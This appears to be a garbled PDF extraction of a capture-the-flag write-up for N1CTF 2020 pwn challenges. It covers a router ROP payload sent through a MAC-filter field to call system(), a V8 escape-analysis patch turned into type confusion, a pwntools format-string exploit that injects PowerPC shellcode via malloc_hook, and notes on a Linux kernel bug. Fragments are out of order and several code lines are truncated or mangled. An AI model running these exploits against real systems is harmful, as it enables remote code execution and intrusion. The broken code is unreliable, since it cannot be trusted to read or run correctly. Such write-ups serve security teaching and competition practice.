system_addr = libc_base + system_offset
gadget1 = libc_base + gadget1_offset
gadget2 = libc_base + gadget2_offset
payload = "A"*176 + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd
data = {"macFilterType": "white", "deviceList": "\r"+ payload}
s=requests.post(url, cookies=cookie, data=data)
print s.text
diff --git a/src/compiler/escape-analysis.cc b/src/compiler/escape-analysis.cc
index 2a096b6933..3046d7b04e 100644
--- a/src/compiler/escape-analysis.cc
+++ b/src/compiler/escape-analysis.cc
@@ -178,7 +178,7 @@ class EscapeAnalysisTracker : public ZoneObject {
         : VariableTracker::Scope(&tracker->variable_states_, node, reduction),
           tracker_(tracker),
           reducer_(reducer) {}
-    const VirtualObject* GetVirtualObject(Node* node) {
+    VirtualObject* GetVirtualObject(Node* node) {
       VirtualObject* vobject = tracker_->virtual_objects_.Get(node);
       if (vobject) vobject->AddDependency(current_node());
       return vobject;
@@ -576,10 +576,14 @@ void ReduceNode(const Operator* op, 
EscapeAnalysisTracker::Scope* current,
     case IrOpcode::kStoreField: {
       Node* object = current->ValueInput(0);
       Node* value = current->ValueInput(1);
-      const VirtualObject* vobject = current->GetVirtualObject(object);
+      VirtualObject* vobject = current->GetVirtualObject(object);
       Variable var;
       if (vobject && !vobject->HasEscaped() &&
           vobject->FieldAt(OffsetOfFieldAccess(op)).To(&var)) {
+        // Attach cached map info to the virtual object.
+        if (OffsetOfFieldAccess(op) == HeapObject::kMapOffset) {
+          vobject->SetMap(value);
+        }
         current->Set(var, value);
         current->MarkForDeletion();
       } else {
@@ -747,6 +751,17 @@ void ReduceNode(const Operator* op, 
EscapeAnalysisTracker::Scope* current,
           // yet.
           break;
         }
+      } else if (vobject) {
+        Node* cache_map = vobject->Map();
+        if (cache_map) {
+          Type const map_type = NodeProperties::GetType(cache_map);
+          if (map_type.IsHeapConstant() &&
+              params.maps().contains(
+                  map_type.AsHeapConstant()->Ref().AsMap().object())) {
+            current->MarkForDeletion();
+            break;
+          }
+        }
       }
       current->SetEscaped(checked);
       break;
@@ -804,6 +819,12 @@ void ReduceNode(const Operator* op, 
EscapeAnalysisTracker::Scope* current,
       for (int i = 0; i ValueInput(i);
         current->SetEscaped(input);
+
+        // Invalidate associated map cache for all value input nodes.
+        VirtualObject* vobject = current->GetVirtualObject(input);
+        if (vobject) {
+          vobject->SetMap(nullptr);
+        }
       }
From the patch we can see that, a new "caching" logic was added in escape analysis . Now 
every virtual object  has a map_  associated with it. It was used in CheckMaps  elimination. One 
thing we need to notice is that the operations on virtual objects  should consider if it's already 
escaped, so this patch introduces a type confusion bug.
After analyzing the patch we can craft ourselves some PoCs:
With the fakeobj  and addrof  primitives constructed out of the PoC, it's not hard to get 
arbitrary read/write primitive. For code execution, I used window.createElement("div")  to 
create a native object with Vtable , and overwrite the Vtable  to get the ﬂag.
Echoserver
First at all, I apologize for the meaningless format string, which wastes many time to adjust it.This 
challenge is inspired by CVE-2017-6736, which use snmp to write shellcode in memory, but I 
failed to design a protocol like that, ﬁnally I choose the format string :( , sorry for that again.
And I've made another mistake: the qemu don't have nx either in system mode. It can jump to 
shellcode directly. My solution contains the step that bypass the nx:
       if (OperatorProperties::HasContextInput(op)) {
         current->SetEscaped(current->ContextInput());
diff --git a/src/compiler/escape-analysis.h b/src/compiler/escape-analysis.h
index 0fbc7d0bdd..ec56488388 100644
--- a/src/compiler/escape-analysis.h
+++ b/src/compiler/escape-analysis.h
@@ -147,11 +147,14 @@ class VirtualObject : public Dependable {
   bool HasEscaped() const { return escaped_; }
   const_iterator begin() const { return fields_.begin(); }
   const_iterator end() const { return fields_.end(); }
+  Node* Map() const { return map_; }
+  void SetMap(Node* map) { map_ = map; }
  private:
   bool escaped_ = false;
   Id id_;
   ZoneVector fields_;
+  Node* map_;
 };
 class EscapeAnalysisResult {
function opt(cb) {
  for(var i = 0; i  {});
}
console.log(opt((o) => { o[0][0] = x; }));
Firstly, overwrite malloc_hook  to 0x10067140 , which is a function can call pointer consecutively, 
then overwrite the ﬁrst function pointer to _dl_make_stack_executable ,and some data use in it 
like __stack_prot . Then overwrite the second function pointer to the address of your shellcode, 
ﬁnally write the shellcode use format string. Then it can be triggered by a large print like 
%114514x . The printf will do malloc(114514 + 0x20),so we can control r3  according to this, and 
pass it to _dl_make_stack_executable .
fmt_attack.py:
from pwn import *
arch = 32
class Payload:
    def __init__(self, index,addon = ''):
        self.__index = index
        self.__payload = ''
        self.__chunk_list = []
        self.__addon = addon
    def add_write_chunk(self, value, address, 
write_len=int(arch/8),is_raw_length = False):
        if write_len != 2 and write_len != 1 and write_len != 4 and write_len != 
8:
            raise ValueError
        if value = (1 = 0x100000000:
                raise ValueError
            if is_raw_length:
                write_chunk = FmtChunkW(value, address, write_len=write_len)
                self.__chunk_list.append(write_chunk)
            else:
                high = value >> 16
                low = value % 0x10000
                high_chunk = FmtChunkW(high, address+2)
                low_chunk = FmtChunkW(low, address)
                self.__chunk_list.append(high_chunk)
                self.__chunk_list.append(low_chunk)
        if write_len == 8:
            if value >= 0x10000000000000000:
                raise ValueError
            for i in range(4):
                write_value = (value >> (i*16)) % 0x10000
                write_address = address + i*2
                self.__chunk_list.append(FmtChunkW(write_value, write_address))
        return
    def get_payload(self):
        self.__chunk_list.sort(cmp=lambda chunk1, chunk2: int(chunk1) - 
int(chunk2))
        guess_length = len(self.__chunk_list) * 12   #  for most solutions
        guess_index = int(guess_length * 8 / arch) + 1
        while True:
            if guess_index > 16,small2big(addr),write_len=2)
    a.add_write_chunk(value & 0xffff,small2big(addr + 2),write_len=2)
add_big_endian(0x10067140,0x100A0E10) # malloc_hook
# add_big_endian(0x100A1000,0x1009FF80) # libc_stack
a.add_write_chunk(7,small2big(0x1009FF88),write_len=4,is_raw_length=True) # 
__stack_prot
'''
dl_make_stack_exec
'''
add_big_endian(0x10053D70,0x1009FB00)  # _dl_make_stack_executable
add_big_endian(0x100A1000,0x1009FAFC)
add_big_endian(u32('flag',endian='big'),0x100a0000)
add_big_endian(u32(asm('lis r3,0x100a')),0x100A1000)
add_big_endian(u32(asm('li r0,5')),0x100A1000 + 4)
add_big_endian(u32(asm('li r4,0')),0x100A1000 + 8)
add_big_endian(u32(asm('sc')),0x100A1000 + 12)
add_big_endian(u32(asm('li r5,0')),0x100A1000 + 16)
add_big_endian(u32(asm('mr r4,r3')),0x100A1000 + 20)
add_big_endian(u32(asm('li r3,1')),0x100A1000 + 24)
add_big_endian(u32(asm('li r0,186')),0x100A1000 + 28)  # sendfile syscall
add_big_endian(u32(asm('li r6,0x100')),0x100A1000 + 32)
add_big_endian(u32(asm('sc')),0x100A1000 + 36)
payload = a.get_payload()
p.send(payload)
# p.recvuntil('n1ctf')
p.interactive()
By the way,it's hard to do stack pivot in powerpc.If this challenge made with x86, it's easy to rop 
with xchg eax,esp  or some gadget like setcontext.
Kemu
Maybe update on https://github.com/Nu1LCTF/n1ctf-2020/tree/main/PWN/Kemu
W2L
This is a challenge of Linux kernel exploitation. The bug introduced in the patch is CVE-2017-7308 
which provides an overwrite primitive. It's not hard to ﬁnd a public exploit for this bug. But the 
way to bypass the KASLR in these public exploits is ad-hoc. I was expecting to see folks can come 
up with a new technique to leak kernel information and thus bypass KALSR. Unfortunately, in the 
script running qemu, I mistakenly disabled SMAP/SMEP which was intended to be enabled. This 
mistake made this challenge easier because ret2usr is suﬃcient to exploit the vulnerability.
I would like to introduce the intended solution for this challenge with SMAP/SMEP and KASLR 
enabled. Since the public exploit has already demonstrated how to obtain the control-ﬂow 
hijacking primitive from the overwrite primitive, I will focus on how to obtain the leak primitive 
from the overwrite primitive so as to leak kernel information and bypass KASLR.